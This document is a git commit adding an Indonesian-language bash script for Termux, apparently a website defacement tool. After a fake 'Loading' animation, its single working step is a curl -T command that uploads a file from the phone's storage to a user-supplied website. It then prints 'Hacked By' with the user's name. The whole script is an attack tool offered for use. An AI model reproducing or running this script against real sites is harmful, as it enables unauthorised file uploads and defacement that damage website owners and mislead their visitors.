5767714a0151170ecb73ae7098d87a294f71c213
RelGanz <105323573+N3WBI31@users.noreply.github.com>
2022-05-15 15:09:49 +0700

    Add files via upload

---
+++ Depes.sh
@@ -0,0 +1,125 @@
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+pkg install curl
+pkg install toilet
+clear
+echo
+echo $white
+read -p "Masukan Nama Anda >> " nama
+clear
+toilet -f future "Depes Website" | lolcat
+echo $red "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+echo $green "Author : RelGanz { MR.BksMilenial }"
+echo $green "Gunakan Dengan Bijak!!!"
+echo $blue
+echo "Taruh File Di Internal Luar Folder!!"
+echo $red "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
+echo
+echo
+echo $cyan "Masukan Script "$white
+read -p "./Zarel.IT >> " tiara
+echo
+echo $cyan "Masukan Web !! "$white
+read -p "RelGanz >> " web
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading !..."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading .!.."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading ..!."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading ...!"
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading !..."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading .!.."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading ..!."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading ...!"
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading !..."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading .!.."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading ..!."
+sleep 0.9
+clear
+echo
+echo
+echo
+echo
+echo $red "Loading ...!"
+sleep 0.9
+clear
+sleep 0.9
+curl -T /sdcard/$tiara $web
+echo
+echo
+echo
+echo
+toilet -f mono12 "DONE !!!" | lolcat
+sleep 3
+clear
+echo
+echo $green "Hacked By $nama"
+echo     
+echo $red "Silahkan Cek "$blue"$web"
